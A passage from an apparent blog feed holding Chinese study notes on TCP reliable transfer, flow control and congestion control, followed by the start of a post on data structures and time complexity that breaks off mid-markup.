1</p><p>发送方窗口（send_window）大于1的协议我们就称之为流水线协议。</p><p>发送缓冲区：</p><p>形式：内存中的一个区域，落入缓冲区的分组可以发送<br>功能：用于存放已发送，但是没有得到确认的分组<br>必要性：需要重发时可用<br>发送缓冲区的大小：一次最多可以发送多少个未经确认的分组</p><p>停止等待协议 &#x3D; 1<br>流水线协议 &gt; 1，合理的值，不能很大，链路利用率不能够超100%</p><p>发送缓冲区中的分组：</p><p>未发送的：落入发送缓冲区的分组，可以连续发送出去；<br>已经发送出去的、等待对方确认的分组：发送缓冲区的分组只有得到确认才能删除</p><p>发送窗口：</p><p>指的是发送缓冲区的一个范围（是发送缓冲区的一个子集）。</p><p>存放已发送但是未确认的分组。（实际上发送传窗口是那些已发送但是未经确认分组的序号构成的空间）</p><p>发送窗口的最大值 ≤ 发送缓冲区的值</p><p>发送窗口的滑动过程：</p><p>一开始：没有发送任何一个分组</p><p>后沿 &#x3D; 前沿</p><p>之间为发送窗口的尺寸 &#x3D; 0</p><p>发送窗口的移动：前沿移动</p><p>每发送一个分组，前沿前移一个单位</p><p>发送窗口前沿移动的极限：不能够超过发送缓冲区</p><p>注意：绿色部分为发送缓冲区</p><p>发送窗口的移动：后沿移动</p><p>后沿移动的条件：收到老分组（后沿）的确认</p><p>结果：发送缓冲区罩住新的分组，来了分组可以发送</p><p>后沿移动的极限：不能够超过前沿</p><p>接收窗口：</p><p>接收窗口 (receiving window) &#x3D; 接收缓冲区</p><p>接收窗口用于控制哪些分组可以接收：</p><p>只有收到的分组序号落入接收窗口内才允许接收<br>若序号在接收窗口之外，则丢弃</p><p>接收窗口尺寸 Wr &#x3D; 1，则只能顺序接收</p><p>举例：</p><p>Wr＝1，在0的位置；只有0号分组可以接收</p><p>向前滑动一个，罩在1的位置，如果来了第2号分组，则丢弃</p><p>接收窗口尺寸 Wr &gt; 1 ，则可以乱序接收（但提交给上层的分组，要按序提交）</p><p>滑动：</p><p>低序号的分组到来（按序），接收窗口移动；<br>高序号分组乱序到，缓存但不交付（因为要实现rdt，不允许失序），不滑动</p><p>发送确认：</p><p>接收窗口尺寸 &#x3D; 1 ； 发送连续收到的最大的分组确认（累计确认）<br>接收窗口尺寸 &gt; 1 ； 收到哪个分组，就发送那个分组的确认（非累计确认）</p><p>绿色区域表示可接收的分组。</p><p>正常情况下两个窗口的互动：</p><p>发送窗口：</p><p>有新的分组落入发送缓冲区范围，发送 → 前沿滑动<br>来了老的低序号分组的确认 → 后沿向前滑动 → 新的分组可以落入发送缓冲区的范围</p><p>接收窗口：</p><p>收到分组，落入到接收窗口范围内，接收<br>发送确认给发送方</p><p>如果低序号分组确认收到，向前滑动接收窗口<br>否则不滑动</p><p>异常情况下GBN的两窗口互动：</p><p>发送窗口：</p><p>新分组落入发送缓冲区范围，发送 → 前沿滑动<br>超时重发机制让发送端将发送窗口中的所有分组发送出去（低序号开始的连续的已发送但未确认的分组全部重新发送）<br>来了老分组的重复确认 → 后沿不向前滑动 → 新的分组无法落入发送缓冲区的范围（此时如果发送缓冲区有新的分组可以发送）</p><p>接收窗口：</p><p>收到乱序分组，没有落入到接收窗口范围内，抛弃<br>（重复）发送老分组的确认，累计确认</p><p>异常情况下SR的两窗口互动：</p><p>发送窗口：</p><p>新分组落入发送缓冲区范围，发送 → 前沿滑动<br>超时重发机制让发送端将超时的分组重新发送出去<br>来了乱序分组的确认 → 后沿不向前滑动 → 新的分组无法落入发送缓冲区的范围（此时如果发送缓冲区有新的分组可以发送）</p><p>接收窗口：</p><p>收到乱序分组，落入到接收窗口范围内，接收<br>发送该分组的确认，单独确认</p><p>由此我们小结一下GBN协议和SR协议的异同：</p><p>相同点：</p><p>发送窗口 &gt; 1<br>一次能够可发送多个未经确认的分组</p><p>不同点：</p><p>GBN :接收窗口尺寸 &#x3D; 1</p><p>接收端：只能顺序接收<br>发送端：从表现来看，一旦一个分组没有发成功，如：0、1、2、3、4; 假如1未成功，2、3、4都发送出去 了，要返回1再发送1、2、3、4。<br>累计确认：cumulative ack<br>发送端拥有对最老的未确认分组的定时器：</p><p>只需设置一个定时器<br>当定时器到时时，重传所有未确认分组</p><p>发送窗口的最大值（序号大小为n）：2n-1</p><p>SR: 接收窗口尺寸 &gt; 1</p><p>接收端：可以乱序接收<br>发送端：发送0、1、2、3、4，一旦1未成功，2、3、4,已发送，无需重发，只选择性发送1。<br>非累计确认&#x2F;独立确认：individual ack<br>发送方为每个未确认的分组保持一个定时器：</p><p>当超时定时器到时，只是重发到时的未确认分组</p><p>发送窗口的最大值（序号大小为n）：2n-1</p><p>列出下表对比一下GBN协议和SR协议：</p><p>GBN<br>SR</p><p>优点<br>简单，所需资源少（接收方一个缓存单元）<br>出错时，重传一个代价小</p><p>缺点<br>一旦出错，回退N步代价大<br>复杂，所需要资源多（接收方多个缓存单元）</p><p>适用范围：</p><p>出错率低：比较适合GBN，出错非常罕见，没有必要用复杂的SR，为罕见的事件做日常的准备和复杂处理<br>链路容量大（延迟大、带宽大）：比较适合SR而不是GBN，一旦出错代价太大</p><p>面向连接的传输：TCP<br>TCP概述</p><p>点对点：一个发送方，一个接收方</p><p>可靠的、按顺序的字节流：没有报文边界</p><p>TCP不提供报文界限：发送方可能发送两个报文，接收方可能会收到一个大的报文，也可能收到四个小的报文。应用进程之间报文的界限需要应用进程自己去维护。</p><p>提供管道化（流水线）的协议：</p><p>TCP拥塞控制和流量控制设置窗口大小</p><p>发送和接收有缓存</p><p>全双工数据：</p><p>在同一连接中数据流双向流动（一方进程可同时发送数据和接收数据）</p><p>面向连接：在数据交换之前，通过握手（交换控制报文） 初始化发送方、接收方的状态变量</p><p>有流量控制：发送方不会淹没接收方</p><p>MSS：最大报文段大小<br>MTU：最大传输单元</p><p>TCP报文段结构</p><p>说明：</p><p>源端口号、目标端口号：16bit</p><p>序号并不是报文段的序号，而是报文段的数据载荷（body）部分的第一个字节在整个字节流中的偏移量。（对字节计数）</p><p>一般情况下序号并不是从0或1这样固定的序号开始：为了避免长时间滞留在网络中的分组所包括的段对新的连接造成影响。</p><p>确认号：依然是字节计数</p><p>如果接收方传来的ACK为555，则表示接收方已经接收到了554及之前所有的字节，并希望发送方下一个传来555字节的数据。（累计确认）<br>接收方处理乱序的报文段：可以缓存，也可以丢弃。</p><p>首部长度：4个字节为单位，表示该TCP段的首部数据大小。</p><p>RSF（RST、SYN、FIN）标志位：主要是用于两个应用进程进行TCP连接的标志位。<br>不同标志位的组合代表不同的握手（后面会提到），以及连接释放请求、确认等。</p><p>接受窗口：用于流量控制。如果接收方的接收窗口为X，则表示接收方可以接收X字节的数据。</p><p>校验和：同UDP中的校验和作用一致。</p><p>TCP确认号和序号实例：</p><p>TCP往返延时（RTT）和超时<br>分析可能的情况：TCP超时应该设置的比RTT长。如果设置太短，就会发生没必要的重传；如果太长，那么对报文段丢失的反应太慢。但是RTT是在不断变化的，因此我们需要定期测量RTT。</p><p>SampleRTT：测量从报文段发出到收到确认的时间。<br>仅用当前的SampleRTT是不合理的，应该对几个最近的测量值求平均。<br>具体公式如下：<br>EstimatedRTT &#x3D; (1- α) × EstimatedRTT + α × SampleRTT</p><p>指数加权移动平均<br>过去样本的影响呈指数衰减<br>推荐值：α &#x3D; 0.125</p><p>进一步我们需要考虑EstimatedRTT的变化范围：</p><p>EstimtedRTT + 安全边界时间</p><p>EstimatedRTT变化大 (方差大) → 较大的安全边界时间</p><p>SampleRTT会偏离EstimatedRTT多远：</p><p>DevRTT &#x3D; (1-β) × DevRTT + β × |SampleRTT-EstimatedRTT|<br>(推荐值：β &#x3D; 0.25)</p><p>由此我们可以计算超时时间间隔：<br>TimeoutInterval &#x3D; EstimatedRTT + 4 × DevRTT</p><p>TCP的可靠数据传输（rdt）</p><p>TCP在IP不可靠服务的基础上建立了rdt</p><p>管道化的报文段：GBN or SR（TCP是两种的混合）<br>累积确认（像GBN）<br>设置单个重传定时器（像GBN）<br>是否可以接受乱序的，TCP没有规范。可以缓存乱序报文段，也可以丢弃。</p><p>通过以下事件触发重传：</p><p>超时（只重发那个最早的未确认段：SR）<br>重复的（三次冗余）确认：</p><p>例子：收到了ACK50,之后又收到3个ACK50</p><p>在分析TCP如何建立rdt，我们依旧采取以上讲可靠数据传输原理的流程，一步一步增加功能。<br>TCP发送方<br>首先考虑简化的TCP发送方：</p><p>忽略重复的确认</p><p>忽略流量控制和拥塞控制</p><p>TCP发送方事件：</p><p>从应用层接收数据：</p><p>用nextseq创建报文段<br>序号nextseq为报文段首字节的字节流编号<br>如果还没有运行，启动定时器</p><p>定时器与最早未确认的报文段关联</p><p>超时：</p><p>重传后沿最老的报文段<br>重新启动定时器</p><p>收到确认：</p><p>如果是对尚未确认的报文段确认</p><p>更新已被确认的报文序号<br>如果当前还有未被确认的报文段，重新启动定时器</p><p>TCP重传（左图为ACK丢失，右图为ACK超时）：</p><p>（下图为累计确认）</p><p>在RFC中对产生TCP ACK的建议（如下表）</p><p>接收方的事件<br>TCP接收方动作</p><p>所期望序号的报文段按序到达。 所有在期望序号之前的数据都已经被确认<br>延迟的ACK。对另一个按序报文段的到达最多等待500ms。如果下一个报文段在这个时间间隔内没有到达，则发送一个ACK。</p><p>有期望序号的报文段到达。另一个按序报文段等待发送ACK（接收到连续的两个段）<br>立即发送单个累积ACK，以确认两个按序报文段。</p><p>比期望序号大的报文段乱序到达。检测出数据流中的间隔<br>立即发送重复的ACK，指明下一个期待字节的序号</p><p>能部分或完全填充接收数据间隔的报文段到达。<br>若该报文段起始于间隔（gap）的低端，则立即发送ACK。</p><p>快速重传<br>产生快速重传的原因：超时周期往往太长（在重传丢失报文段之前的延时太长）。<br>快速重传：在定时器过时之前重发报文段</p><p>由三个冗余ACK触发</p><p>它假设跟在被确认的数据后面的数据丢失了：</p><p>第一个ACK是正常的；<br>收到第2个该段的ACK，表示接收方收到一个该段后的乱序段；<br>收到第3，4个该段的ack，表示接收方收到该段之后的2个 ，3个乱序段，可能性非常大段丢失了</p><p>如果发送方收到同一数据 的3个冗余ACK，重传最小序号的段。</p><p>TCP流量控制<br>流量控制：接收方控制发送方，不让发送方发送的太多、太快以至于让接收方的缓冲区溢出。</p><p>接收方在其向发送方的TCP段头部的rwnd字段“通告”其空闲buffer大小</p><p>RcvBuffer大小通过socket选项设置 (典型默认大小为4096 字节)<br>很多操作系统自动调整 RcvBuffer</p><p>发送方限制未确认(“inflight”)字节的个数 ≤ 接收方发送过来的rwnd值</p><p>保证接收方不会被淹没</p><p>连接管理<br>在正式交换数据之前，发送方和接收方握手建立通信关系:</p><p>同意建立连接（每一方都知道对方愿意建立连接）<br>同意连接参数（准备、初始化资源）</p><p>建立连接<br>首先考虑2次握手总是可行的吗？（仅一方发送连接请求，另一方收到后发送连接确认）<br>有很多因素会导致2次握手的失败：</p><p>变化的延迟（连接请求的段没有丢，但可能超时）<br>由于丢失造成的重传 (e.g. req_conn(x))<br>报文乱序<br>相互看不到对方</p><p>2次握手的失败场景：</p><p>说明<br>在客户端接收服务器发来的连接确认之前定时器到时，那么客户端就会再发送一条新的连接建立请求，如此服务器会消耗资源去维护许多不必要的“半连接”。<br>数据超时会导致服务器将老数据按照新的数据处理。</p><p>所以2次握手是不可取的，由此引入了3次握手。</p><p>SYNbit &#x3D; 1 表示建立连接请求</p><p>3次握手可以有效地解决半连接和接收老数据的问题</p><p>3次握手的FSM表示：</p><p>关闭连接</p><p>客户端，服务器分别关闭它自己这一侧的连接</p><p>发送FIN bit &#x3D; 1的TCP段</p><p>一旦接收到FIN，用ACK回应</p><p>接到FIN段，ACK可以和它自己发出的FIN段一起发送</p><p>可以处理同时的FIN交换</p><p>这样的连接拆除方式并不完美：<br>会存在一方拆除连接，另一方还维持连接的情况。</p><p>拥塞控制原理<br>拥塞的非正式定义: “太多的数据需要网络传输，超过了网络的处理能力。”<br>拥塞控制与流量控制不同：拥塞控制指的是网络的问题，流量控制指的是接收方的问题。<br>拥塞的表现:</p><p>分组丢失 (路由器缓冲区溢出)<br>分组经历比较长的延迟(在路由器的队列中排队)</p><p>拥塞是网络中前10位的问题</p><p>产生拥塞的原因&#x2F;代价<br>场景一：</p><p>2个发送端，2个接收端<br>一个路由器，具备无限大的缓冲<br>输出链路带宽：R<br>没有重传</p><p>如左图：当λin逐渐增加时，λout也在增加，当λin达到R&#x2F;2时，λout达到最大值，也就是说每个连接的最大吞吐量为R&#x2F;2。<br>如右图：从延迟的角度看，当进入的速率λin接近链路链路带宽R时，延迟陡增。</p><p>场景二：</p><p>一个路由器，有限的缓冲<br>分组丢失时，发送端重传</p><p>应用层的输入&#x3D;应用层输出：λin &#x3D; λout<br>传输层的输入包括重传：λin ≥ λout</p><p>理想化场景：发送端有完美的信息，即发送端知道什么时候路由器的缓冲是可用的。</p><p>只在缓冲可用时发送</p><p>不会丢失：λ’in &#x3D; λin</p><p>这样情况依然同上：</p><p>但是这样的代价很大：每个路由器都需要告知发送方自己的空闲缓冲区有多大，不好实现。</p><p>理想化场景二：掌握丢失信息。即分组可以丢失，在路由器由于缓冲器满而被丢弃。</p><p>如果知道分组丢失了，发 送方重传分组</p><p>会丢失：λ’in &gt; λin</p><p>分析：这样一来，为了让λout逼近于R&#x2F;2，就需要让λ’in比既定的输出要大（因为存在分组丢失）。</p><p>重传的丢失分组<br>没有必要重传的重复分组</p><p>代价：</p><p>为了达到一个有效输出，网络需要做更多的工作（重传）<br>没有必要的重传，链路中包括了多个分组的拷贝（超时）</p><p>是那些没有丢失，经历的时间比较长（拥塞状态）但是超时的分组</p><p>因为网络拥塞而导致接收效率降低，而为了提高接收效率，就会增加发送量，如此一来会加剧网络拥塞，如果不加以控制，那么网络最终会瘫痪。这也是拥塞的特性。</p><p>场景三：</p><p>4个发送端</p><p>多重路径</p><p>超时／重传</p><p>从宏观上来看，各方都不停地向网络中发送数据，就会发生网络拥塞的一个极致：整个网络出现死锁的情况<br>代价：当分组丢失时，任何“关于这个分组的上游传输能力” 都被浪费了。</p><p>拥塞控制方法</p><p>端到端拥塞控制：</p><p>没有来自网络的显式反馈<br>端系统根据延迟和丢失事件推断是否有拥塞<br>TCP采用此方法</p><p>网络辅助的拥塞控制：</p><p>路由器提供给端系统以反馈信息</p><p>单个bit置位，显示有拥塞 (SNA, DECbit,TCP&#x2F;IP ECN, ATM)<br>显式提供发送端可以采用的速率</p><p>首先来了解网络辅助的拥塞控制，以 ATM ABR 拥塞控制为例<br>ABR: available bit rate: ATM网络的其中一个模式</p><p>“弹性服务”<br>如果发送端的路径“轻载 ”</p><p>发送方尽可能使用可用带宽</p><p>如果发送方的路径拥塞了：</p><p>发送方限制其发送的速度到一个最小保障速率上</p><p>RM (资源管理) 信元:</p><p>由发送端发送,在数据信元中间隔插入<br>RM信元中的比特被交换机设置 (“网络辅助”)</p><p>NI bit: no increase in rate (轻微拥塞)速率不要增加了<br>CI bit: congestion indication 拥塞指示</p><p>发送端发送的RM 信元被接收端返回, 接收端不做任何改变</p><p>在RM信元中的2个字节 ER (explicit rate)字段</p><p>拥塞的交换机可能会降低信元中ER的值<br>发送端发送速度因此是最低的可支持速率</p><p>数据信元中的EFCI bit: 被拥塞的交换机设置成1</p><p>如果在管理信元RM前面的数据信元EFCI被设置成了1, 接收端在返回的RM信元中设置CI bit</p><p>TCP拥塞控制<br>TCP采用端到端的拥塞控制。<br>端到端的拥塞控制机制：</p><p>路由器不向主机有关拥塞的反馈信息</p><p>路由器的负担较轻<br>符合网络核心简单的TCP&#x2F;IP架构原则（复杂性放在网络边缘，传输层及以上）</p><p>端系统根据自身得到的信息，判断是否发生拥塞，从而采取动作</p><p>拥塞控制的几个问题：</p><p>如何检测拥塞：</p><p>轻微拥塞<br>拥塞</p><p>控制策略：</p><p>在拥塞发送时如何动作，降低速率</p><p>轻微拥塞，如何降低<br>拥塞时，如何降低</p><p>在拥塞缓解时如何动作，增加速率</p><p>拥塞感知</p><p>某个段超时了（丢失事件 ）：拥塞</p><p>超时时间到，某个段的确认没有来<br>原因1：网络拥塞（某个路由器缓冲区没空间了，被丢弃），概率大<br>原因2：出错被丢弃了（各级错误，没有通过校验，被丢弃），概率小<br>一旦超时，就认为拥塞了，有一定误判，但是总体控制方向是对的</p><p>有关某个段的3次重复ACK：轻微拥塞（如下图）</p><p>段的第1个ack，正常，确认绿段，期待红段</p><p>段的第2个重复ack，意味着红段的后一段收到了，蓝段乱序到达</p><p>段的第2、3、4个ack重复，意味着红段的后第2、3、4个段收到了，橙段乱序到达，同时红段丢失的可能性很大（后面3个段都到了，红段都没到）</p><p>网络这时还能够进行一定程度的传输，拥塞但情况要比第一种好</p><p>速率控制方法</p><p>维持一个拥塞窗口的值：CongWin</p><p>发送端限制已发送但是未确认的数据量（的上限）:<br>LastByteSent - LastByteAcked ≤ CongWin</p><p>从而粗略地控制发送方的往网络中注入的速率（如下公式）：<br>$$rate ≈ \frac{ConWin}{RTT} bytes&#x2F;sec<br>$$</p><p>CongWin是动态的，是感知到的网络拥塞程度的函数：</p><p>超时或者3个重复ack，CongWin会下降：</p><p>超时时：CongWin降为1MSS,进入SS阶段然后再倍增到CongWin&#x2F;2（每个RTT），从而进入CA阶段<br>3个重复ack ：CongWin降为CongWin&#x2F;2，CA阶段</p><p>如果没有超时：CongWin会上升</p><p>SS（慢启动）阶段：加倍增加(每个RTT)<br>CA（拥塞避免）阶段：线性增加(每个RTT)</p><p>联合控制的方法：<br>TCP拥塞控制和流量控制的联合动作。<br>发送端控制发送但是未确认的量同时也不能够超过接收窗口，满足流量控制要求：</p><p>SendWin &#x3D; min {CongWin, RecvWin}<br>同时满足拥塞控制和流量控制要求</p><p>TCP拥塞控制策略</p><p>慢启动<br>AIMD：线性增、乘性减少<br>超时事件后的保守策略</p><p>TCP慢启动：</p><p>连接刚建立, CongWin &#x3D; 1 MSS</p><p>例如： MSS &#x3D; 1460bytes  &amp; RTT &#x3D; 200 msec，则初始速率 &#x3D; 58.4kbps</p><p>但是可用带宽可能远大于MSS&#x2F;RTT，所以应该尽快加速，到达希望的速率</p><p>当连接开始时，指数性增加（每个RTT）发送速率直到发生丢失事件</p><p>每一个RTT， CongWin加倍<br>每收到一个ACK时，CongWin加1<br>慢启动阶段：只要不超时或3个重复ack，一个RTT，CongWin加倍</p><p>初始速率很慢，但是加速却是指数性的</p><p>AIMD：</p><p>乘性减：<br>丢失事件后将CongWin降为1，将CongWin&#x2F;2作为阈值，进入慢启动阶段（倍增直到 CongWin&#x2F;2）</p><p>加性增：<br>当CongWin &gt; 阈值时，一个RTT如没有发生丢失事件 ,将CongWin加1MSS: 探测</p><p>策略不同：</p><p>当收到3个重复的ACKs：</p><p>CongWin 减半<br>窗口（缓冲区大小）之后线性增长</p><p>当超时事件发生时：</p><p>CongWin被设置成 1 MSS，进入SS阶段<br>之后窗口指数增长<br>增长到一个阈值（上次发生拥塞的窗口的一半）时 ，再线性增加</p><p>再次强调一下何时候应该将指数性增长变成线性增长：<br>在超时之前，当 CongWin变成上次发生超时的窗口的一半时<br>具体实现：</p><p>变量：Threshold</p><p>出现丢失，Threshold设置成 CongWin的1&#x2F;2</p><p>小结</p><p>事件<br>状态<br>TCP 发送端行为<br>解释</p><p>以前没有收到ACK的data被ACKed<br>慢启动 (SS)<br>CongWin &#x3D; CongWin + MSS If (CongWin &gt; Threshold) ,状态变成 “CA”<br>每一个RTT CongWin 加倍</p><p>以前没有收到ACK的data 被ACKed<br>拥塞避免 (CA)<br>CongWin &#x3D; CongWin+MSS × (MSS&#x2F;CongWin)<br>加性增加, 每一个RTT对 CongWin 加一个 1 MSS</p><p>通过收到3个重复的ACK，发现丢失的事件<br>SS or CA<br>Threshold &#x3D; CongWin&#x2F;2，CongWin &#x3D; Threshold+3，状态变成“CA”，<br>快速重传, 实现乘性的减，CongWin 没有变成1 MSS.</p><p>超时<br>SS or CA<br>Threshold &#x3D; CongWin&#x2F;2,CongWin &#x3D; 1 MSS,状态变成“SS”<br>进入slow start</p><p>重复的 ACK<br>SS or CA<br>对被ACKed 的segment， 增加重复ACK的计数<br>CongWin and Threshold 不变</p><p>TCP吞吐量<br>使用窗口window尺寸W和RTT来描述TCP的平均吞吐量（忽略慢启动阶段，假设发送端总有数据传输）：</p><p>W：发生丢失事件时的窗口尺寸（单位：字节）</p><p>平均窗口尺寸：3&#x2F;4W</p><p>平均吞吐量：RTT时间吞吐3&#x2F;4W<br>$$avg TCPthtuput &#x3D; \frac{3}{4}\frac{W}{RTT} bytes&#x2F;sec<br>$$</p><p>TCP公平性<br>公平性目标: 如果 K个TCP会话分享一个链路带宽为R的瓶颈，每一个会话的有效带宽为 R&#x2F;K</p><p>分析为什么TCP是公平的（2个竞争的TCP会话为例，假设两个会话的RTT相等）：</p><p>加性增加，斜率为1, 吞吐量增加</p><p>乘性减，吞吐量比例减少</p><p>（具体省略详细解释，但是这个平衡的过程真的很神奇）</p><p>考虑并行TCP连接：</p><p>如果带宽为R的链路支持了 9个TCP连接</p><p>如果新的应用要求建1个TCP连接,获得带宽R&#x2F;10<br>如果新的应用要求建11个TCP 连接,获得带宽R&#x2F;2</p>]]></content>
      
      
      <categories>
          
          <category> 专业课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到1学习数据结构与算法（更新中）</title>
      <link href="/post/896d251.html"/>
      <url>/post/896d251.html</url>
      
        <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="0-数据结构的研究内容"><a href="#0-数据结构的研究内容" class="headerlink" title="0.数据结构的研究内容"></a>0.数据结构的研究内容</h2><p>研究非数值计算的程序设计问题中计算机的操作对象以及它们之间的关系和操作。</p><p>实践中即设计出合适的数据结构及相应的算法即：首先要考虑对相关的各种信息如何表示、组织和存储？</p><h2 id="1-基本概念和术语"><a href="#1-基本概念和术语" class="headerlink" title="1.基本概念和术语"></a>1.基本概念和术语</h2><p>1.<strong>数据</strong>（data）：<br>所有能输入到计算机中去的描述客观事物的符号。</p><pre><code>数值性数据（实数、整数）非数值性数据（多媒体信息处理：字符串、图形、图像、声音）</code></pre><p>2.<strong>数据元素</strong>（data element）：<br>数据的基本单位，也<br>称结点（node）或<br>记录（record）</p><p>3.<strong>数据项</strong>（data item）：<br>组成数据元素的、有独立含义的、不可分割的数据最小单位，也称域&#x2F;字段(field)</p><p>4、<strong>数据对象</strong>(Data Object)：<br>相同特性数据元素的集合，是数据的一个子集</p><p>5、<strong>数据结构</strong>（Data Structure）<br>是相互之间存在一种或多种特定关系的数据元素的集合。</p><blockquote><p>数据结构的两个层次：</p></blockquote><ul><li><p><strong>逻辑结构</strong>:数据元素间抽象化的相互关系，与数据的存储无关，独立于计算机，它是从具体问题抽象出来的数学模型</p></li><li><p><strong>存储结构</strong>（物理结构）:数据元素及其关系在计算机存储器中的存储方式。</p></li></ul><h3 id="一、逻辑结构"><a href="#一、逻辑结构" class="headerlink" title="一、逻辑结构"></a>一、逻辑结构</h3><p>分法1：</p><ul><li>线性结构—-<br>有且仅有一个开始和一个终端结点<br>，并且所有结点都最多只有一个直<br>接前趋和一个后继。<br>例如：线性表、栈、队列、串</li><li>非线性结构—-<br>一个结点可能有多个直接前趋和直<br>接后继。<br>例如：树、图</li></ul><p>分法2：</p><p><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%92%E5%88%86%E6%96%B9%E6%B3%952.png" alt="分法二"></p><h3 id="二、存储结构"><a href="#二、存储结构" class="headerlink" title="二、存储结构"></a>二、存储结构</h3><p>存储结构分为：</p><ul><li><strong>顺序存储结构</strong>借助元素在存储器中的相对位置来表示数据元素间的逻辑关系。（需要一片连续存储空间，一般借助数组来描述）</li><li><strong>链式存储结构</strong>借助指示元素存储地址的指针表示数据元素间的逻辑系。（无需占用一整块存储空间）</li></ul><blockquote><p>数据的运算</p></blockquote><p>逻辑结构和存储结构都相同, 但运算不同, 则数据结构不同. 例如, 栈与队列</p><p>对于一种数据结构, 常见的运算:<br><em>插入 删除 修改 查找 排序</em></p><blockquote><p><strong>数据类型</strong>：在一种程序设计语言中，变量所具有的数据种类</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FORTRAN语言：整型、实型、和复数型</span><br><span class="line">C语言：基本数据类型： char int float double void</span><br><span class="line">       构造数据类型：数组、结构体、共用体、文件</span><br></pre></td></tr></table></figure><blockquote><p><strong>抽象数据类型</strong></p></blockquote><ul><li>更高层次的数据抽象。</li><li>由用户定义，用以表示应用问题的数据<br>模型。</li><li>由基本的数据类型组成, 并包括一组相关<br>的操作。</li></ul><p>抽象数据类型可以用以下三元组表示：</p><pre><code>ADT=(D,S,P)D是数据对象S是D上的关系集P是D上的操作集</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ADT抽象数据类型名&#123;</span><br><span class="line">  数据对象：&lt;数据对象的定义&gt;</span><br><span class="line">  数据关系：&lt;数据关系的定义&gt;</span><br><span class="line">  基本操作：&lt;基本操作的定义&gt;</span><br><span class="line">&#125;ADT抽象数据类型名</span><br></pre></td></tr></table></figure><h2 id="2-抽象数据类型的表示与实现"><a href="#2-抽象数据类型的表示与实现" class="headerlink" title="2.抽象数据类型的表示与实现"></a>2.抽象数据类型的表示与实现</h2><p>（1）预定义常量及类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//预定义常量：函数结果状态代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERFLOW 2</span></span><br><span class="line"><span class="comment">//预定义类型status是函数返回值类型，其值是函数结果状态代码。</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> Status; <span class="comment">//给类型定义新名字</span></span><br></pre></td></tr></table></figure><p>（2）数据元素被约定为ElemType类型，用户需要根据具体情况，自行定义该数据类型。</p><p>（3）算法去描述为以下的函数形式：</p><pre><code>函数类型 函数名（函数参数表）&#123;  语句序列;&#125;</code></pre><p>（4）内存的动态分配与释放<br>使用new和delete动态分配和释放内存空间</p><p>分配空间  指针变量&#x3D;new数据类型；</p><p>释放空间   delete指针变量；</p><p>（5）赋值语句</p><p>（6）选择语句</p><p>（7）循环语句</p><p>（8）使用的结束语句形式有</p><ul><li>函数结束语句retum</li><li>循环结束语句break;</li><li>异常结束语句exit（异常代码）</li></ul><p>（9）输入输出语句形式有</p><ul><li>输入语句cin(scanf())</li><li>输出语句cout(printf())</li></ul><p>（10）扩展函数有</p><ul><li>求最大值max</li><li>求最小值mm</li></ul><h2 id="3-算法与算法分析"><a href="#3-算法与算法分析" class="headerlink" title="3.算法与算法分析"></a>3.算法与算法分析</h2><h3 id="3-1一些定义与理解"><a href="#3-1一些定义与理解" class="headerlink" title="3.1一些定义与理解"></a>3.1一些定义与理解</h3><p><strong>算法</strong>：一个有穷的指令集，这些指令为解决某一特定任务规定了一个运算序列</p><p>算法的描述：</p><pre><code>自然语言流程图程序设计语言伪码</code></pre><p><strong>算法效率</strong>：用依据该算法编制的程序在计算机上执行所消耗的时间来度量</p><ul><li><strong>问题</strong>规模是算法求解问题<strong>输入量</strong>的多少，是问题大小的本质表示，一般用<strong>整数n</strong>表示</li><li><strong>算法的执行时间</strong>大致等于所有语句执行时间的<strong>总和</strong>，而语句的执行时间则为该条语句的<strong>重复执行次数</strong>和<strong>执行一次所需时间</strong>的乘积，一条语句的重复执行次数被称为<strong>语句频度</strong></li><li>算法分析并非统计精确执行时间</li><li>若每条语句执行一次所需时间均是单位时间，则一个算法的<br>执行时间可用算法的所有语句（通常只考虑“基本语句”）频度之和度量。</li><li>基本语句：指算法中重复执行次数和算法的执行时间成正比<br>的语句</li></ul><h3 id="3-2时间复杂度的渐进表示法"><a href="#3-2时间复杂度的渐进表示法" class="headerlink" title="3.2时间复杂度的渐进表示法"></a>3.2时间复杂度的渐进表示法</h3><blockquote><p>通常，算法中基本语句重复执行的次数是问题规模n的某个函数f(n),算法的时间量度记作：<em><strong>T(n)&#x3D;O(f(n))</strong></em></p></blockquote><pre><code>  n越大算法的执行时间越长  ·排序：n为记录数  ·矩阵：n为矩阵的阶数  ·多项式：n为多项式的项数  ·集合：n为元素个数  ·树：n为树的结点个数  ·图：n为图的顶点数或边数</code></pre><h3 id="3-3分析时间复杂度的基本方法"><a href="#3-3分析时间复杂度的基本方法" class="headerlink" title="3.3分析时间复杂度的基本方法"></a>3.3分析时间复杂度的基本方法</h3><ul><li>找出语句频度最大的那条语句作为基本语句</li><li>计算基本语句的频度得到问题规模月的某个函数／(n)</li><li>取其数量级用符号“0“表示</li></ul><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A61.png" alt="时间复杂度1"></p><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E4%BE%8B1.png" alt="时间复杂度例1"></p><p><img src="/img/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E4%BE%8B2.png" alt="时间复杂度例2"></p><p><img src="/img/%E5%B8%B8%E8%A7%81%E7%B4%AF%E5%8A%A0%E6%B1%82%E5%92%8C%E5%85%AC%E5%BC%8F.png" 